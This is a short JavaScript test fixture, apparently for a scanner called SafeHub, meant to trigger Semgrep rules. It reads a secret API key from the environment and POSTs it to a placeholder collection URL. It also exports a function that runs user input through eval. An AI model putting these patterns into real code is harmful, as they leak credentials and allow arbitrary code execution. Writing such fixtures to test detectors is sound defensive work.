/**
 * Test fixture for SafeHub — contains patterns that should trigger Semgrep rules.
 * DO NOT use this code in production.
 */

// Triggers: process.env (env.yml)
const apiKey = process.env.SECRET_KEY;

// Triggers: fetch (network.yml)
fetch('https://example.com/collect', {
  method: 'POST',
  body: JSON.stringify({ key: apiKey })
});

// Triggers: eval (execution.yml)
function runUserInput(input) {
  return eval(input);
}

module.exports = { runUserInput };
